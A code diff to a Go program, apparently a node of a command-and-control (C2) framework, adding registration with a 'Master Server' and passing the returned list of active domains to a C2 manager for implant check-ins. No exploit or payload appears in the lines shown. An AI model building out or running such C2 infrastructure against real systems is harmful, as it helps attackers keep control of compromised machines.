@@ -695,6 +695,21 @@ func main() {
 	// Initialize Master Client
 	masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, debugMode)
 
+	// Register with Master and retrieve active domain list
+	fmt.Println("Registering with Master Server...")
+	activeDomains, err := masterClient.RegisterWithMaster(cfg.Domain, cfg.BindAddr)
+	if err != nil {
+		fmt.Printf("⚠️  WARNING: Failed to register with Master Server: %v\n", err)
+		fmt.Println("Continuing with local configuration")
+	} else {
+		fmt.Printf("✓ Registered with Master - received %d active domains\n", len(activeDomains))
+		if debugMode && len(activeDomains) > 0 {
+			fmt.Printf("   Active domains: %v\n", activeDomains)
+		}
+		// Store active domains in C2 manager for first check-in responses
+		c2Manager.SetKnownDomains(activeDomains)
+	}
+
 	// Perform initial check-in
 	fmt.Println("Connecting to Master Server...")
 	stats := map[string]interface{}{
